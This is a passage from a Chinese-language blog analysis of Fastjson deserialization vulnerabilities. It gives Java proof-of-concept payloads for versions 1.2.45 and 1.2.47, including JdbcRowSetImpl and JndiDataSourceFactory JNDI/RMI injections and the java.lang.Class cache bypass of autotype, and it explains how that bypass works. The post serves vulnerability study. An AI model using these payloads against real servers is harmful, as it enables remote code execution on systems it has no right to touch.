class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ExecTest\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608210021446.png" alt="image-20220608210021446"></p>
<h1 id="0x5-Version-1-2-45"><a href="#0x5-Version-1-2-45" class="headerlink" title="0x5 Version 1.2.45"></a>0x5 Version 1.2.45</h1><p>黑名单绕过</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="string">&quot;properties&quot;</span>:&#123;<span class="string">&quot;data_source&quot;</span>:<span class="string">&quot;rmi://localhost:1099/Exploit&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>



<h1 id="0x6-Version-1-2-47"><a href="#0x6-Version-1-2-47" class="headerlink" title="0x6 Version 1.2.47"></a>0x6 Version 1.2.47</h1><p>POC:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">V147</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;rand1\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;, \n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;rand2\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;dataSourceName\&quot;: \&quot;rmi://127.0.0.1:1099/ExecTest\&quot;, \n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;autoCommit\&quot;: true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608212509587.png" alt="image-20220608212509587"></p>
<p>这个版本发生了不开启autotype情况下能利用成功的绕过。解析一下这次的绕过：</p>
<ol>
<li>利用到了<code>java.lang.class</code>，这个类不在黑名单，所以checkAutotype可以过</li>
</ol>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608221450948.png" alt="image-20220608221450948"></p>
<ol start="2">
<li>这个<code>java.lang.class</code>类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中</li>
</ol>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608221744667.png" alt="image-20220608221744667"></p>
<ol start="3">
<li>如果再次加载val名称的class，并且autotype没开启（因为开启了会先检测黑白名单，所以这个漏洞开启了反而不成功），下一步就是会尝试从全局map中获取这个class，如果获取到了，后面的流程也就同上了</li>
</ol>
<p>​    <code>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean)</code></p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608224614026.png" alt="image-20220608224614026"></p>
<h1 id="0x7-Version-1-2-63"><a href="#0x7-Version-1-2-63" class="headerlink" title="0x7 Version 1.2.63"></a>0x7 Version 1.2.63</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/232774#h3-14">https://www.anquanke.com/post/id/232774#h3-14</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sdihvai/article/details/111871147">https://blog.csdn.net/sdihvai/article/details/111871147</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1192/#fastjson">https://paper.seebug.org/1192/#fastjson</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/994/#0x01-fastjson">https://paper.seebug.org/994/#0x01-fastjson</a></p>
<p><a target="_blank" rel="noopener" href="http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</a></p>
</div><script src="/js/jquery.min.js"></script><script src="/js/main.js"></script></body></html>